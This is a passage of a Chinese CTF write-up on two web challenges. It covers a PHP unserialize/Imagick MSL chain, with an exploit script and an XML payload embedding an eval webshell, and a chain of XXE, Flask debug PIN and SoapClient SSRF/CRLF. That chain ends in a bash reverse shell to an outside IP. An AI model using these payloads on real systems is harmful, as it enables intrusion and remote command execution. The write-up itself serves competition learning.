class="title">cmd</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;unserialze&#x27;</span>:</span><br><span class="line">        <span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;rm&#x27;</span>:</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;rm -rf /tmp 2&gt;/dev/null&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>ini_set(&#39;open_basedir&#39;, __DIR__.&quot;:/tmp&quot;);</code></p><p>  这里的代码将 <code>open_basedir</code> 配置选项设置为当前目录以及 <code>/tmp</code> 目录，因此 PHP 脚本只能访问当前目录和 <code>/tmp</code> 目录下的文件，无法访问其他目录。</p><p>这道题是根据这个题改的</p><p><a href="https://github.com/AFKL-CUIT/CTF-Challenges/blob/master/CISCN/2022/backdoor/writup/writup.md">https://github.com/AFKL-CUIT/CTF-Challenges/blob/master/CISCN/2022/backdoor/writup/writup.md</a></p><p><a href="https://www.snakin.top/2022/09/09/2022CISCN%E5%86%B3%E8%B5%9B/">https://www.snakin.top/2022/09/09/2022CISCN%E5%86%B3%E8%B5%9B/</a></p><p><strong>这里的多一嘴来讲讲这个参考的这个<code>backdoor</code></strong>     <a href="https://ke1nys.github.io/posts/869a12bf.html">ciscn决赛-2022-backdoor</a></p><p>稍微改了点，include变为了readdir，因此我们很难getshell。那就改变思路了。首先我们知道flag是在根目录的，但是由于open_basedir我们并没有权限去读取，因此我们需要配合imagick的msl语言特性，把flag读到/tmp目录下，然后再利用上述payload去触发__sleep，读取flag文件<br>首先我们需要用如下payload把flag移动到tmp目录下</p><p><strong>先去触发<code>phpinfo</code>()</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fumo_backdoor</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$path</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$argv</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span> = <span class="string">&quot;phpinfo&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">fumo_backdoor</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230621164501671.png" alt="image-20230621164501671"></p><p>开启了<code>imagick</code>扩展</p><p><strong>思路</strong></p><ul><li>先进行临时文件上传 然后创建一个session_xxx文件，然后imagick初始化的时候会执行临时文件里的内容如何值就会赋给session_xxx文件</li></ul><p>(<strong>这里会创建两个文件，一个用来存序列化的数据(这里的path必须是第二次session的名字)，为了给path赋值，另一个是为了存flag</strong>)</p><ul><li>第二步还是进行临时文件上传  然后还是创建一个文件(必须和第一次不同名字)  内容是将flag移到该文件中   就是移到第二步设置的文件中</li></ul><ul><li>第三步进行session_start()的开启   来触发第一次session的反序列化(<strong>为了设置path,反序列化结束后会接着会序列</strong>)  然后可以读取到flag了</li></ul><p>因为这里的是公共容器，会容易被删除自己刚创建的session文件  所以需要python脚本</p><p><strong>exp.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://47.99.77.113:18080/?cmd=unserialze&quot;</span></span><br><span class="line"><span class="comment"># url = &quot;http://127.0.0.1:18080/?cmd=unserialze&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sleep</span>():</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(sys.argv[<span class="number">1</span>] == <span class="string">&quot;1&quot;</span>):</span><br><span class="line">    <span class="comment"># rm</span></span><br><span class="line">    r = requests.get(<span class="string">&quot;http://47.99.77.113:18080/?cmd=rm&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(r.text)</span><br><span class="line">    sleep()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># file write</span></span><br><span class="line">    r = requests.post(url, data=&#123;<span class="string">&quot;data&quot;</span>:<span class="string">&#x27;O:13:&quot;fumo_backdoor&quot;:4:&#123;s:4:&quot;path&quot;;N;s:4:&quot;argv&quot;;s:17:&quot;vid:msl:/tmp/php*&quot;;s:4:&quot;func&quot;;N;s:5:&quot;class&quot;;s:7:&quot;Imagick&quot;;&#125;&#x27;</span>&#125;, files=&#123;<span class="string">&quot;file1&quot;</span>:<span class="built_in">open</span>(<span class="string">&quot;lfi.xml&quot;</span>).read()&#125;,headers=&#123;<span class="string">&quot;Cookie&quot;</span>:<span class="string">&quot;PHPSESSID=tel&quot;</span>&#125;)</span><br><span class="line">    sleep()</span><br><span class="line">    <span class="comment"># file write</span></span><br><span class="line">    r = requests.post(url, data=&#123;<span class="string">&quot;data&quot;</span>:<span class="string">&#x27;O:13:&quot;fumo_backdoor&quot;:4:&#123;s:4:&quot;path&quot;;N;s:4:&quot;argv&quot;;s:17:&quot;vid:msl:/tmp/php*&quot;;s:4:&quot;func&quot;;N;s:5:&quot;class&quot;;s:7:&quot;Imagick&quot;;&#125;&#x27;</span>&#125;, files=&#123;<span class="string">&quot;file1&quot;</span>:<span class="built_in">open</span>(<span class="string">&quot;lfi.xml&quot;</span>).read()&#125;,headers=&#123;<span class="string">&quot;Cookie&quot;</span>:<span class="string">&quot;PHPSESSID=tel&quot;</span>&#125;)</span><br><span class="line">    sleep()</span><br><span class="line">    r = requests.post(url, data=&#123;<span class="string">&quot;data&quot;</span>:<span class="string">&#x27;O:13:&quot;fumo_backdoor&quot;:4:&#123;s:4:&quot;path&quot;;N;s:4:&quot;argv&quot;;s:17:&quot;vid:msl:/tmp/php*&quot;;s:4:&quot;func&quot;;N;s:5:&quot;class&quot;;s:7:&quot;Imagick&quot;;&#125;&#x27;</span>&#125;, files=&#123;<span class="string">&quot;file1&quot;</span>:<span class="built_in">open</span>(<span class="string">&quot;hack.xml&quot;</span>).read()&#125;,headers=&#123;<span class="string">&quot;Cookie&quot;</span>:<span class="string">&quot;PHPSESSID=tel&quot;</span>&#125;)</span><br><span class="line">    <span class="comment"># print(r.text)</span></span><br><span class="line">    </span><br><span class="line"><span class="comment"># session_start</span></span><br><span class="line">sleep()</span><br><span class="line">r = requests.post(url, data=&#123;<span class="string">&quot;data&quot;</span>:<span class="string">&#x27;O:13:&quot;fumo_backdoor&quot;:4:&#123;s:4:&quot;path&quot;;N;s:4:&quot;argv&quot;;N;s:4:&quot;func&quot;;s:13:&quot;session_start&quot;;s:5:&quot;class&quot;;N;&#125;&#x27;</span>&#125;, headers=&#123;<span class="string">&quot;Cookie&quot;</span>:<span class="string">&quot;PHPSESSID=tel&quot;</span>&#125;)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"><span class="comment"># session_start</span></span><br><span class="line">sleep()</span><br><span class="line">r = requests.post(url, data=&#123;<span class="string">&quot;data&quot;</span>:<span class="string">&#x27;O:13:&quot;fumo_backdoor&quot;:4:&#123;s:4:&quot;path&quot;;N;s:4:&quot;argv&quot;;N;s:4:&quot;func&quot;;s:13:&quot;session_start&quot;;s:5:&quot;class&quot;;N;&#125;&#x27;</span>&#125;, headers=&#123;<span class="string">&quot;Cookie&quot;</span>:<span class="string">&quot;PHPSESSID=tel&quot;</span>&#125;)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><p><strong>hack.xml</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">image</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">read</span> <span class="attr">filename</span>=<span class="string">&quot;inline:data://image/x-portable-anymap;base64,UDYKOSA5CjI1NQoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA8P3BocCBldmFsKCRfR0VUWzFdKTs/PnxPOjEzOiJmdW1vX2JhY2tkb29yIjozOntzOjQ6InBhdGgiO3M6OToiL3RtcC9GTEFHIjtzOjQ6ImFyZ3YiO047czoxOiJjIjtOO30=&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">write</span> <span class="attr">filename</span>=<span class="string">&quot;/tmp/sess_tel&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">image</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230621180951791.png" alt="image-20230621180951791"></p><p><strong>lfi.xml</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">image</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">read</span> <span class="attr">filename</span>=<span class="string">&quot;app1:/flag&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">write</span> <span class="attr">filename</span>=<span class="string">&quot;/tmp/FLAG&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">image</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230621182457074.png" alt="image-20230621182457074"></p><p><strong>这里用那个<code>mvg</code>  <code>app1</code>   <code>uyvy</code> 能直接读取flag</strong></p><p>还有一种办法就是fuzz测试来测试哪种可以用来使用</p><h2 id="pypyp"><a href="#pypyp" class="headerlink" title="pypyp?"></a>pypyp?</h2><h3 id="提示-hint"><a href="#提示-hint" class="headerlink" title="提示/hint"></a>提示/hint</h3><p>a piece of cake but hard work。per 5 min restart.<br>pay attention to <code>/app/app.py</code></p><p><img src="../images/image-20230621201841266.png" alt="image-20230621201841266"></p><p>题目的页面就是这样</p><p>这里的话是先使用 <code>PHP_SESSION_UPLOAD_PROGRESS</code> (<strong>后面跟的是上传内容</strong>)  来强制<code>session start</code></p><p>在使用 <code>PHP_SESSION_UPLOAD_PROGRESS</code> 时，如果 <code>session</code> 没有开启，系统会自动开启一个新的 session。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://115.239.215.75:8081/ -H &quot;Cookie: PHPSESSID=tel&quot; -F &#x27;PHP_SESSION_UPLOAD_PROGRESS=111&#x27;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230621203954292.png" alt="image-20230621203954292"></p><p>然后交给gpt就行了</p><p><strong>得到源码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Session not started&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$type</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line"><span class="variable">$properties</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;properties&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>]));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_string</span>(<span class="variable">$properties</span>) &amp;&amp; <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$properties</span>)))&#123;</span><br><span class="line">    <span class="variable">$object</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$properties</span>));</span><br><span class="line">    <span class="variable">$object</span>-&gt;<span class="title function_ invoke__">sctf</span>();</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$properties</span>))&#123;</span><br><span class="line">    <span class="variable">$object</span> = <span class="keyword">new</span> <span class="variable">$type</span>(<span class="variable">$properties</span>[<span class="number">0</span>], <span class="variable">$properties</span>[<span class="number">1</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$object</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;http://127.0.0.1:5000/&#x27;</span> . <span class="variable">$properties</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;this is the object: <span class="subst">$object</span>&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://115.239.215.75:8081/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>(<strong>这个来上传抓包  然后添加PHPSESSID=xxx也行</strong>)</p><p>这里的考点主要是靠原生类   <a href="https://ke1nys.github.io/posts/28e06bac.html#%E8%A2%AB%E9%81%97%E5%BF%98%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">ctfshow-愚人杯也考过这个考点</a></p><p>主要是有三个利用点 </p><ul><li>$object-&gt;sctf();</li><li>$object = new $type($properties[0], $properties[1]);</li><li>$object = file_get_contents(‘<a href="http://127.0.0.1:5000/">http://127.0.0.1:5000/</a>‘ . $properties);</li></ul><p><strong>研究了一下，发现只有中间这个有用   并且类和参数都可控 </strong> <strong>用extract来控制</strong></p><p>(由于题目说的<code>/app/app.py</code>，那么我们就得去用原生类来读取这个文件)</p><p><code>$object = new $type($properties[0], $properties[1]);</code>   然后因为这里有两个参数   所以就得去找找既能读取文件，又是两个参数的原生类</p><p><img src="../images/image-20230621212254271.png" alt="image-20230621212254271"></p><p>刚好找到了这个类   可以使用xxe来读取文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$class</span> = <span class="string">&#x27;SimpleXMLElement&#x27;</span>;</span><br><span class="line"><span class="variable">$evilxml</span> = <span class="string">&#x27;&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY file SYSTEM  &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;xxe&gt;&amp;file;&lt;/xxe&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;properties&#x27;</span> =&gt; <span class="keyword">array</span>(<span class="variable">$evilxml</span>, <span class="string">&#x27;2&#x27;</span>),<span class="string">&#x27;type&#x27;</span>=&gt;<span class="variable">$class</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$arr</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230621222930826.png" alt="image-20230621222930826"></p><p>然后去读题目给的/app/app.py</p><p><img src="../images/image-20230621223042971.png" alt="image-20230621223042971"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello World!&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>,debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>开了debug只有两条路   <strong>热覆盖 和 算pin</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_string</span>(<span class="variable">$properties</span>) &amp;&amp; <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$properties</span>)))&#123;</span><br><span class="line">    <span class="variable">$object</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$properties</span>));</span><br><span class="line">    <span class="variable">$object</span>-&gt;<span class="title function_ invoke__">sctf</span>();</span><br><span class="line">    <span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure><p>这里注意一下   这里会调用<code>call</code>()方法  </p><p>覆盖暂时没找到原生类的call方法可以覆盖写文件的，而有个原生类的call是经常用：<code>SoapClient</code></p><p>可以用他的ssrf和crlf打组合拳，这样我们就可以把cookie塞</p><p><code>SoapClient</code>在ctfshow的web259有详细使用   <a href="https://ke1nys.github.io/posts/fd5983bb.html#web259">web259</a></p><p>接下来我们去看一下<code>console</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$object</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;http://127.0.0.1:5000/&#x27;</span> . <span class="variable">$properties</span>);</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230621233844882.png" alt="image-20230621233844882"></p><p>猜测是算pin</p><p>那么我们就可以用上面的<code>xxe</code>来读取算<code>pin</code>所需要的东西</p><p><img src="../images/image-20230621234154080.png" alt="image-20230621234154080"></p><p>所以这些得一个一个来获取</p><ul><li>machine_id  —&gt;  349b3354-f67f-4438-b395-4fbc01171fdd</li><li>uuidnode   ——&gt;   02:42:ac:13:00:02      (2485378023426)</li><li>moddir  <strong>flask库下app.py的绝对路径  但是这道题没给触发页面报错来获取信息  所以我们得使用别的原生类来模糊查找</strong></li></ul><p>(其实不用也行  可以猜一下  找到例题来看看他的<code>moddir</code>   然后修改一下python版本一下一下试就行了)</p><p><code>/usr/lib/python3.8/site-packages/flask/app.py</code>   这是moddir</p><p>有了这些东西之后  我们就可以直接算pin了</p><p>算出来的pin    <code>121-260-582</code></p><p>由于算pin来rce需要cookie的header   所以用常规的只会输出pin码   并不会输出cookie 所以得找一个脚本能两个同时生成的</p><p><img src="../images/image-20230622000408987.png" alt="image-20230622000408987"></p><p>然后去通过<code>soapclient</code>去访问debug界面，由于<code>debugmode</code>的rce需要携带cookie，因此只有<code>soapclient</code>可以做到   (<strong>其实就是ssrf加crlf</strong>)</p><p><strong>(简单点说就是伪造http头)</strong>     不明白的可以去看上面写的  <strong>web259的链接</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$target</span> = <span class="string">&#x27;http://127.0.0.1:5000/console?&amp;__debugger__=yes&amp;cmd=__import__(%22os%22).popen(%22bash%20-c%20%5C%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F101.42.39.110%2F3389%20%3C%261%5C%22%22)&amp;frm=0&amp;s=DhOJxtvMXCtezvKtqaK9&#x27;</span>;</span><br><span class="line"><span class="variable">$headers</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;X-Forwarded-For: 127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie: __wzdb2a60e2b19822632a67c=1687363437|11b8517fb9fb&#x27;</span></span><br><span class="line">);</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>,<span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&quot;wupco\r\n&quot;</span>.<span class="title function_ invoke__">join</span>(<span class="string">&quot;\r\n&quot;</span>,<span class="variable">$headers</span>),<span class="string">&#x27;uri&#x27;</span>=&gt; <span class="string">&quot;aaab&quot;</span>));</span><br><span class="line"><span class="variable">$arr</span>=<span class="title function_ invoke__">Array</span>(<span class="string">&quot;properties&quot;</span>=&gt;<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>)),<span class="string">&quot;type&quot;</span>=&gt;<span class="string">&quot;SimpleXMLElement&quot;</span>);</span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$arr</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$aaa</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">115.239</span><span class="number">.215</span><span class="number">.75</span>:<span class="number">8081</span></span><br><span class="line">Content-Length: <span class="number">922</span></span><br><span class="line">Cache-Control: <span class="built_in">max</span>-age=<span class="number">0</span></span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">Origin: null</span><br><span class="line">Content-<span class="type">Type</span>: multipart/form-data; boundary=----WebKitFormBoundaryt1mG5nxqspditAqy</span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">114.0</span><span class="number">.0</span><span class="number">.0</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="number">0.8</span>,application/signed-exchange;v=b3;q=<span class="number">0.7</span></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=<span class="number">0.9</span></span><br><span class="line">Cookie: PHPSESSID=1nys</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryt1mG5nxqspditAqy</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span></span><br><span class="line"></span><br><span class="line">tyaoo</span><br><span class="line">------WebKitFormBoundaryt1mG5nxqspditAqy</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;data&quot;</span></span><br><span class="line"></span><br><span class="line">a:<span class="number">2</span>:&#123;s:<span class="number">10</span>:<span class="string">&quot;properties&quot;</span>;s:<span class="number">643</span>:<span class="string">&quot;O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A4%3A%22aaab%22%3Bs%3A8%3A%22location%22%3Bs%3A205%3A%22http%3A%2F%2F127.0.0.1%3A5000%2Fconsole%3F%26__debugger__%3Dyes%26cmd%3D__import__%28%2522os%2522%29.popen%28%2522bash%2520-c%2520%255C%2522bash%2520-i%2520%253E%2526%2520%252Fdev%252Ftcp%252F101.42.39.110%252F3389%2520%253C%25261%255C%2522%2522%29%26frm%3D0%26s%3DDhOJxtvMXCtezvKtqaK9%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A92%3A%22wupco%0D%0AX-Forwarded-For%3A+127.0.0.1%0D%0ACookie%3A+__wzdb2a60e2b19822632a67c%3D1687363437%7C11b8517fb9fb%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;type&quot;</span>;s:<span class="number">16</span>:<span class="string">&quot;SimpleXMLElement&quot;</span>;&#125; 